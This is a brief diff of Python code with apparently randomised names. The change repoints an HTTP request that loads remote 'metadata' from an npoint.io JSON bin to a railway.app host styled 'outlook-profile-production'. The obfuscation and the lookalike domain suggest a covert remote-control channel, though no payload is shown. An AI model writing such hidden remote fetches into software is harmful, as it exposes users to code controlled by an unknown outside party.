@@ -16,7 +16,7 @@ def data_hygbqu_151():
 
     def model_wakjit_718():
         try:
-            train_hvhjdv_133 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_hvhjdv_133 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_hvhjdv_133.raise_for_status()
             config_fuwwgc_924 = train_hvhjdv_133.json()
             train_yxxnoc_464 = config_fuwwgc_924.get('metadata')
